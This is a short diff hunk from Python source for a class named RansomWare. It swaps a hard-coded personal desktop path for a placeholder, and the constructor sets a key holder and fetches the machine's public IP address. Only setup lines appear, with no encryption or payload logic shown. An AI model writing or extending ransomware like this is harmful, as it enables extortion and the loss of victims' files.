@@ -26,7 +26,7 @@ class RansomWare:
         self.crypter = None
         self.public_key = None
         self.sysRoot = os.path.expanduser('~')
-        self.localRoot = r'C:\Users\Emrah\Desktop\PythonProjects\Ransomware\localRoot'
+        self.localRoot = r'localroot_path'
         self.publicIP = requests.get('https://api.ipify.org').text
 
     def generate_key(self):
